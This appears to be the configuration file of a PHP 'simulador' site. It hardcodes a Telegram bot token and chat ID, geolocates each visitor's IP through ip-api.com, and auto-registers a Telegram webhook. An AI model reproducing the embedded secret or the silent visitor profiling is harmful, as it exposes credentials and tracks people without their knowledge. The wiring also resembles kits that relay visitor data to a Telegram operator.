<?php
$token   = "8774822300:AAGtFNdzJJBOZDzu1gwxasQWU7EFBpHHsX4";
$chat_id = "7655000874";

// ============================================================
// Helpers IP + Geolocalización
// ============================================================
if (!function_exists('client_ip')) {
    function client_ip(): string {
        foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
            if (!empty($_SERVER[$h])) {
                $ip = trim(explode(',', $_SERVER[$h])[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
            }
        }
        return '';
    }
}

if (!function_exists('geo_lookup')) {
    /**
     * Devuelve ['ip','country','country_code','flag','city','region','isp']
     * Usa ip-api.com (gratis, sin key). Cachea 6h por IP.
     */
    function geo_lookup(string $ip): array {
        $out = ['ip'=>$ip,'country'=>'?','country_code'=>'','flag'=>'','city'=>'','region'=>'','isp'=>''];
        if (!$ip || !filter_var($ip, FILTER_VALIDATE_IP)) return $out;

        $cacheDir = __DIR__ . '/acciones';
        if (!is_dir($cacheDir)) @mkdir($cacheDir, 0755, true);
        $cacheFile = $cacheDir . '/.geo_' . md5($ip) . '.json';
        if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < 21600)) {
            $c = @json_decode(@file_get_contents($cacheFile), true);
            if (is_array($c)) return $c + $out;
        }

        $url = "http://ip-api.com/json/" . urlencode($ip)
             . "?fields=status,country,countryCode,city,regionName,isp,query";
        $ctx = stream_context_create(['http'=>['timeout'=>3,'ignore_errors'=>true]]);
        $resp = @file_get_contents($url, false, $ctx);
        if ($resp !== false) {
            $j = json_decode($resp, true);
            if (is_array($j) && ($j['status'] ?? '') === 'success') {
                $cc = strtoupper($j['countryCode'] ?? '');
                $flag = '';
                if (strlen($cc) === 2) {
                    // convierte código país a emoji bandera 🇬🇹
                    $flag = mb_convert_encoding('&#'.(127397 + ord($cc[0])).';', 'UTF-8', 'HTML-ENTITIES')
                          . mb_convert_encoding('&#'.(127397 + ord($cc[1])).';', 'UTF-8', 'HTML-ENTITIES');
                }
                $out = [
                    'ip'           => $j['query']      ?? $ip,
                    'country'      => $j['country']    ?? '?',
                    'country_code' => $cc,
                    'flag'         => $flag,
                    'city'         => $j['city']       ?? '',
                    'region'       => $j['regionName'] ?? '',
                    'isp'          => $j['isp']        ?? '',
                ];
                @file_put_contents($cacheFile, json_encode($out));
            }
        }
        return $out;
    }
}

// ============================================================
// Auto-registro del webhook de Telegram (una sola vez)
// ============================================================
(function () use ($token) {
    $flag = __DIR__ . '/.webhook_set';
    $host = $_SERVER['HTTP_HOST'] ?? '';
    if (!$host) return;

    $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')
           || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
        ? 'https' : 'http';

    if ($scheme !== 'https') return;

    // bot.php está junto a este archivo (simulador/bot.php)
    $script  = $_SERVER['SCRIPT_NAME'] ?? '';           // p.ej. /simulador/data.php
    $baseDir = rtrim(str_replace('\\', '/', dirname($script)), '/'); // /simulador
    $webhookUrl = $scheme . '://' . $host . $baseDir . '/bot.php';

    $signature = sha1($token . '|' . $webhookUrl);

    if (file_exists($flag) && trim(@file_get_contents($flag)) === $signature) {
        return;
    }

    $ctx = stream_context_create([
        'http' => ['timeout' => 4, 'ignore_errors' => true],
    ]);
    $api = "https://api.telegram.org/bot{$token}/setWebhook?" . http_build_query([
        'url'                  => $webhookUrl,
        'drop_pending_updates' => 'true',
    ]);
    $resp = @file_get_contents($api, false, $ctx);
    if ($resp !== false) {
        $j = json_decode($resp, true);
        if (!empty($j['ok'])) {
            @file_put_contents($flag, $signature);
        }
    }
})();
